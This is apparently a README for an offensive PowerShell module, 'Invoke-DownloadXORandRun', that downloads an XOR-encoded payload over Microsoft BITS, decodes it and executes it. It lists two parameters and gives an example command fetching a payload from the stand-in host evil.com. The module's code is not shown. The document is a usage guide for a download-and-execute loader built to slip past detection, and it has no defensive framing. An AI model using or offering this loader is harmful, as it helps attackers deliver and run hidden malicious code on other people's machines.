# Invoke-DownloadXORandRun
This module downloads an XOR encoded payload via Microsoft BITS, decodes and runs it.

## Quick Start Guide
There are currently two parameters: 


**pURL** 
The remote path of the single-byte encoded file

**XOREncodeKey**
The value of the XOR Encoding

```PowerShell
Invoke-DownloadXORandRun -pURL http://evil.com/6aenc.out -XorEncodeKey 6A
```

